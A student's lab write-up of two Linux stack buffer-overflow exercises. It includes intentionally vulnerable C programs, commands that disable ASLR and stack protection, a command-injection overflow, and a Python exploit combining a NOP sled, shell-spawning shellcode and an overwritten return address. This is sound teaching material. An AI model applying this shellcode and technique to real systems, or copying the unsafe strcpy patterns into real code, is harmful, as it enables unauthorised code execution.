# Content

- [Content](#content)
  - [Linux Buffer Overflow: Command Injection](#linux-buffer-overflow-command-injection)
    - [Link lab](#link-lab)
      - [Purpose](#purpose)
    - [The way to do](#the-way-to-do)
      - [Creating a Vulnerable Program](#creating-a-vulnerable-program)
      - [Running the Program Normally](#running-the-program-normally)
      - [Observing a Crash](#observing-a-crash)
      - [Finding the Code Injection Point](#finding-the-code-injection-point)
      - [Executing the "ls" command](#executing-the-ls-command)
  - [Linux Buffer Overflow](#linux-buffer-overflow)
    - [Link lab](#link-lab-1)
      - [Purpose](#purpose-1)
    - [The way to do](#the-way-to-do-1)
      - [Observing ASLR](#observing-aslr)
      - [Disabling ASLR](#disabling-aslr)
      - [Creating a Vulnerable Program](#creating-a-vulnerable-program-1)
      - [Using Python to Create an Exploit File](#using-python-to-create-an-exploit-file)
      - [Overflowing the Stack](#overflowing-the-stack)
      - [Debugging the Program](#debugging-the-program)
      - [Normal Execution](#normal-execution)
      - [Overflowing the Stack with "A" Characters](#overflowing-the-stack-with-a-characters)
      - [Quit and Installing Hexedit](#quit-and-installing-hexedit)
      - [Targeting the Return Address](#targeting-the-return-address)
      - [Testing Exploit 2 in the Debugger](#testing-exploit-2-in-the-debugger)
      - [Quit and Getting Shellcode](#quit-and-getting-shellcode)
      - [Understanding a NOP Sled](#understanding-a-nop-sled)
      - [Constructing the Exploit](#constructing-the-exploit)
      - [Testing Exploit 3 in gdb](#testing-exploit-3-in-gdb)
      - [Choosing an Address](#choosing-an-address)
      - [Quit and Insert the Correct Address Into the Exploit](#quit-and-insert-the-correct-address-into-the-exploit)
      - [Testing Exploit 4 in gdb](#testing-exploit-4-in-gdb)

  
## Linux Buffer Overflow: Command Injection

### Link lab[](https://samsclass.info/127/proj/p1-lbci.htm)

#### Purpose

- To develop a very simple buffer overflow exploit in Linux, using injected shell commands.

### The way to do

#### Creating a Vulnerable Program

- This program inputs a name from the user and prints out a "Goodbye" message. It then calls system() to print out the Linux version. It uses two buffers in a subroutine to
do that in an unsafe manner, allowing the name buffer to overflow into the command buffer.
- In terminal, i create a file named `buf.c` with the content below:
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  void bo(char *name, char *cmd);
  int main(){
    char name[200];
    printf("What is your name?\n");
    scanf("%s", name);
    bo(name, "uname -a");
    return 0;
  }
  void bo(char *name, char *cmd){
    char c[200];
    char buffer[200];
    printf("Name buffer address: %p\n", (void*)buffer);
    printf("Command buffer address: %p\n", (void*)c);
    strcpy(c, cmd);
    strcpy(buffer, name);
    printf("Goodbye, %s!\n", buffer);
    printf("Executing command: %s\n", c);
    fflush(stdout);
    system(c);
  }
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/1.png)
- Execute this command to compile the code without modern protections against stack overflows, and with debugging symbols.
  ```bash
  gcc -g -fno-stack-protector -z execstack -o buf buf.c
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/2.png)

#### Running the Program Normally

- Execute this command.
  ```
  ./buf
  ```
- Enter your first name when prompted to.
- The program prints out the location of the Name buffer and the command buffer, says "Goodbye", and excutes the command "uname -a", as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/3.png)

#### Observing a Crash

- Execute this command.
  ```
  ./buf
  ```
- Enter fifty 'A' characters instead of your name.
- The program attempts to execute the command AAAAAAA, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/4.png)

#### Finding the Code Injection Point

- Execute this command.
  ```
  ./buf
  ```
- Enter:
  - Ten 'A' characters, then
  - Ten 'B' characters, then
  - Ten 'C' characters, then
  - Ten 'D' characters, then
  - Ten 'E' characters.
- The program attempts to execute the command EEEEEEEEEE, as shown below. So any text we put in place of EEEEEEEEEE will execute.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/5.png)

#### Executing the "ls" command

- Execute this command.
  ```
  ./buf
  ```
- Enter ten 'A' characters, then ten 'B' characters, then ten 'C' characters, then ten 'D' characters, then ls
- The program executes the "ls" command, showing the files in your working directory, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/6.png)

## Linux Buffer Overflow

### Link lab[](https://samsclass.info/127/proj/lbuf1.htm)

#### Purpose

- To develop a very simple buffer overflow exploit in Linux. This will give you practice with these techniques.
  - Writing very simple C code.
  - Compiling with gcc.
  - Debugging with gdb.
  - Understanding the registers $esp, $ebp, and $eip.
  - Understanding the structure of the stack.
  - Using Python to create simple text patterns.
  - Editing a binary file with hexedit.
  - Using a NOP sled.

### The way to do

#### Observing ASLR

- Address Space Layout Randomization is a defense feature to make buffer overflows more difficult, and Kali Linux uses it by default.
- To see what it does, we'll use a simple C program that shows the value of $esp -- the Extended Stack Pointer.
- In a Terminal, execute this command.
  ```bash
  nano esp.c
  ```
- Enter this code, as shown below:
  ```c
  #include <stdio.h>
  void main() {
          register int i asm("esp");
          printf("$esp = %#010x\n", i);
  }
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/7.png)
- In a Terminal, execute these commands.
  ```bash
  gcc -o esp esp.c
  ./esp
  ./esp
  ./esp
  ```
- Each time you run the program, esp changes, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/8.png)
- This makes you much safer, but it's an irritation we don't need for this project, so we'll turn it off.

#### Disabling ASLR

- Fortunately, it's easy to temporarily disable ASLR in Kali Linux.
- In a Terminal, execute these commands.
  ```bash
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  ./esp
  ./esp
  ./esp
  ```
- Now esp is always the same, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/9.png)

#### Creating a Vulnerable Program

- This program does nothing useful, but it's very simple. It takes a single string argument, copies it to a buffer, and then prints "Done!".
- In a Terminal window, execute this command.
  ```bash
  nano bo1.c
  ```
- Enter this code.
  ```c
  #include <string.h>
  #include <stdio.h>
  void main(int argc, char *argv[]) {
	  char buffer[100];
	  strcpy(buffer, argv[1]);
	  printf("Done!\n");
  }
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/10.png)
- Execute these commands to compile the code without modern protections against stack overflows, and run it with an argument of "A".
  ```bash
  gcc -g -fno-stack-protector -z execstack -o bo1 bo1.c
  ./bo1 A
  ```
- The code exits normally, wth the "Done!" message, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/11.png)

#### Using Python to Create an Exploit File

- In a Terminal window, execute this command.
  ```bash
  nano b1
  ```
- Type in the code shown below.
- The first line indicates that this is a Python program, and the second line prints 116 'A' characters.
  ```python
  #!/usr/bin/python 
  print 'A' * 116
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/12.png)
- Nest we need to make the program executable and run it.
- In a Terminal window, execute these commands.
  ```bash
  chmod a+x b1
  ./b1
  ```
- The program prints out 116 'A' characters, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/13.png)
- Now we need to put the output in a file named e1.
- In a Terminal window, execute these commands.
- Note that the second command is "LS -L E*" in lowercase characters.
  ```bash
  ./b1 > e1
  ls -l e1
  ```
- This creates a file named "e1" containing 116 "A" characters and a line feed, for a total of 117 characters, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/14.png)

#### Overflowing the Stack

- In a Terminal window, execute this command.
- Note: the "$(cat e1)" portion of this command prints out the contents of the e1 file and feeds it to the program as a command-line argument. A more common way to do the same thing is with the input redirection operator: "./bo1 < e1". However, that technique gave different results in the command-line and the debugger, so the $() construction is better for this project.
  ```bash
  ./bo1 $(cat e1)
  ```
- The program runs, copies the string, returns from strcpy(), prints "Done!", and then crashes with a "Segmentation fault" message, as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/15.png)

#### Debugging the Program

- Execute these commands to run the file in the gdb debugging environment, list the source code, and set a breakpoint.
  ```bash
  gdb bo1
  list
  break 6
  ```
- Because this file was compiled with symbols, the C source code is visible in the debugger, with handy line numbers, as shown below.
- The "break 6" command tells the debugger to stop before executing line 6, so we can examine the state of the processor and memory.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/16.png)

#### Normal Execution

- In the gdb debugging environment, execute these commands.
  ```bash
  run A
  info registers
  ```
- The code runs to the breakpoint, and shows the registers, as shown below.
- The important registers for us now are.
  - $esp (the top of the stack)
  - $ebp (the bottom of the stack)
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/17.png)
- In the gdb debugging environment, execute this command.
  ```bash
  x/40x $esp
  ```
- This command is short for "eXamine 40 heXadecimal words, starting at $esp". It shows the stack. Find these items, as shown below.
  - The highlighted region is the stack frame for main(). It starts at the 32-bit word pointed to by $esp and continues through the 32-bit word pointed to by $ebp.
  - The bytes in the yellow box are the input string: "A" (41 in ANSI) followed by a null byte (00) to terminate the string. Note that strings are placed in the stack backwards, in a right-to-left fashion.
  - The word in the green box is the first word after $ebp. This is the return address -- the address of the next instruction to be executed after main() returns. Controlling this value is essential for the exploit.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/18.png)

#### Overflowing the Stack with "A" Characters

- In the gdb debugging environment, execute this command.
  ```bash
  run $(cat e1)
  ```
- gdb warns you that a program is already running. At the "Start it from the beginning? (y or n)" prompt, type y and then press Enter.
- The program runs to the breakpoint.
- In the gdb debugging environment, execute these commands.
  ```bash
  info registers
  x/40x $esp
  ```
- Notice that $esp has changed--this often makes trouble later on, but for now just find these items in your display,as shown below.
  - The highlighted region is the stack frame for main(), starting at $esp and ending at $ebp.
  - Starting in the third line, the whole stack is now full of "41" values, because the input was a long string of "A" characters.
  - The word in the green box is the return address -- it's now full of "41" values too.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/19.png)

#### Quit and Installing Hexedit

- In a Terminal window, execute these commands.
  ```bash
  apt-get update
  apt-get install hexedit
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/20.png)

#### Targeting the Return Address

- In a Terminal window, execute these commands.
  ```bash
  cp e1 e2
  hexedit e2
  ```
- This copies your DoS exploit file e1 to a new file named e2, and starts it in the hexedit hexadecimal editor.
- In the hexedit window, carefully change the last 4 '41' bytes from "41 41 41 41" to "31 32 33 34", as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/21.png)

#### Testing Exploit 2 in the Debugger

- In a Terminal window, execute these commands.
  ```bash
  gdb bo1
  break 6
  run $(cat e2)
  info registers
  x/40x $esp
  ```
- As you can see, the return address is now 0x34333231, as outlined in green in the image below.
- This means you can control execution by placing the correct four bytes here, in reverse order.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/22.png)
- However, there must be exactly 112 bytes before the four bytes that will end up in $eip.

#### Quit and Getting Shellcode

- The shellcode is the payload of the exploit. It can do anything you want, but it must not contain any null bytes (00) because they would terminate the string prematurely and prevent the buffer from overflowing.
- Of course, you are already root on Kali Linux, so this exploit doesn't really accomplish anything, but it's a way to see that you have exploited the program.
- The shellcode used to spawn a "dash" shell is as follows.
  ```bash
  \x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
  \xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80
  ```
- This shellcode is 32 bytes long.

#### Understanding a NOP Sled

- There are some imperfections in the debugger, so an exploit that works in gdb may fail in a real Linux shell. This happens because environment variables and other details may cause the location of the stack to change slightly.
- The usual solution for this problem is a NOP Sled--a long series of "90" bytes, which do nothing when processed and proceed to the next instruction.
- For this exploit, we'll use a 64-byte NOP Sled.

#### Constructing the Exploit

- In a Terminal window, execute this command.
  ```bash
  nano b3
  ```
- Type in the code shown below.
- Line by Line Explanation
  - The first statement indicates that this is a Python program
  - The second statement puts 64 '\x90' (hexadecimal 90) characters into a variable named "nopsled".
  - The third statement places the 32-byte shellcode into a variable named "shellcode". This statement is several lines lone.
  - The fourth statement makes a variable named "padding" that is long enough to bring the total to 112 bytes
  - The fifth statement makes a variable named eip that contains the bytes I want to inject into the $eip register: '1234', at this point.
  - The sixth statement prints it all out in order.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/23.png)
- Nest we need to make the program executable and run it.
- In a Terminal window, execute these commands.
  ```bash
  chmod a+x b3
  ./b3 > e3
  hexedit e3
  ```
- The exploit should look exactly like the image below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/24.png)

#### Testing Exploit 3 in gdb

- In a Terminal window, execute these commands.
  ```bash
  gdb bo1
  break 6
  run $(cat e3)
  info registers
  x/40x $esp
  ```
- This loads the exploit, executes it, and stops so we can see the stack.
- Find these items.
  - The shellcode, as highlighted in red in the image below.
  - The NOP Sled--the "90" values before the shellcode.
  - The "A" characters--the "41" values after the shellcode.
  - The return pointer, highlighted in green in the image below, with a value of 0x34333231.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/25.png)

#### Choosing an Address

- You need to choose an address to put into $eip. If everything were perfect, you could simply use the address of the first byte of the shellcode. However, to give us some room for error, choose an address somewhere in the middle of the NOP sled.
- In the figure above, a good address to use is
  ```
  0xbffff450
  ```

#### Quit and Insert the Correct Address Into the Exploit

- We need to change eip to 0xbffff440. However, since the Intel x86 processor is "little-endian", the least significant byte of the address comes first, so we need to reverse the order of the bytes, like this.
  ```bash
  eip = '\x50\xf4\xff\xbf'
  ```
- In the Terminal, execute these commands.
  ```bash
  cp b3 b4
  nano b4
  ```
- Change the address in eip to match the code and image below.
  ```python 
  #!/usr/bin/python 
  nopsled = '\x90' * 64 
  shellcode = (
  '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
  '\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
  '\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
  )
  padding = 'A' * (112 - 64 - 32)
  eip = '\x50\xf4\xff\xbf'
  print nopsled + shellcode + padding + eip
  ```
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/26.png)
- In a Terminal window, execute these commands.
  ```bash
  chmod a+x b4
  ./b4 > e4
  hexedit e4
  ```
- The exploit should look exactly like the image below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/27.png)

#### Testing Exploit 4 in gdb

- In a Terminal window, execute these commands.
  ```bash
  gdb bo1
  break 6
  run $(cat e4)
  info registers
  x/40x $esp
  ```
- This loads the exploit, executes it, and stops so we can see the stack.
- Now the return address is 0xbffff450, as shown below. That should work!
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/28.png)
- In the gdb window, execute this command.
  ```bash
  continue
  ```
- The exploit works, executing a new program "/bin/dash", as shown below.
  ![Picture](../12.%20Linux%20Buffer%20Overflows/Image/29.png)
